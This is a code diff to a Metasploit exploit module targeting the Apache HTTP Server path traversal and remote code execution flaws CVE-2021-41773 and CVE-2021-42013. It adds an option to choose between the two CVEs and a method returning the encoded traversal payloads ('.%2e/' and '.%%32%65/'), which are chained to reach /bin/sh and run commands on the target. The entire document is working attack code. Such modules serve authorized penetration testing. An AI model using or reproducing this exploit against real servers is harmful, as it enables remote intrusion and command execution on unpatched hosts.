@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Exploit::Remote
         'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
         'DefaultOptions' => {
           'CheckModule' => 'auxiliary/scanner/http/apache_normalize_path',
-          'StartMode' => 'RCE',
+          'Action' => 'CHECK_RCE',
           'RPORT' => 443,
           'SSL' => true
         },
@@ -82,8 +82,9 @@ class MetasploitModule < Msf::Exploit::Remote
     )
 
     register_options([
-      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
-      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
+      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),
+      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),
+      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])
     ])
   end
 
@@ -92,7 +93,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def execute_command(command, _opts = {})
-    traversal = '.%%32%65/' * datastore['DEPTH'] << '/bin/sh'
+    traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'
 
     uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
     response = send_request_raw({
@@ -111,6 +112,19 @@ class MetasploitModule < Msf::Exploit::Remote
     "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
+  def pick_payload
+    case datastore['CVE']
+    when 'CVE-2021-41773'
+      payload = '.%2e/'
+    when 'CVE-2021-42013'
+      payload = '.%%32%65/'
+    else
+      payload = ''
+    end
+
+    payload
+  end
+
   def exploit
     @proto = (ssl ? 'https' : 'http')
 
@@ -118,7 +132,7 @@ class MetasploitModule < Msf::Exploit::Remote
       fail_with(Failure::NotVulnerable, 'The target is not exploitable.')
     end
 
-    print_status(message('Attempt to exploit for CVE-2021-42013'))
+    print_status(message("Attempt to exploit for #{datastore['CVE']}"))
     case target['Type']
     when :linux_dropper
 
